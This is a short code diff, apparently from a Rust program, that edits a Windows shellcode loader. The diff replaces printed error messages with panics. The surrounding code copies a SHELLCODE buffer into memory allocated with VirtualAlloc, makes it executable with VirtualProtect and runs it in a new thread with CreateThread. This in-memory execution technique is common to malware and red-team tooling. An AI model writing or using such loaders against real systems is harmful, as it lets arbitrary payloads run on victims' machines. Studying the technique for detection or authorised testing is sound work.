@@ -18,24 +18,21 @@ fn main() {
     unsafe {
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest.is_null() {
-            eprintln!("VirtualAlloc failed!");
-            return;
+            panic!("VirtualAlloc failed!");
         }
 
         copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
 
         let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtect failed!");
-            return;
+            panic!("VirtualProtect failed!");
         }
 
         let dest = transmute(dest);
 
         let thread = CreateThread(null(), 0, dest, null(), 0, null_mut());
         if thread == 0 {
-            eprintln!("CreateThread failed!");
-            return;
+            panic!("CreateThread failed!");
         }
 
         WaitForSingleObject(thread, WAIT_FAILED);
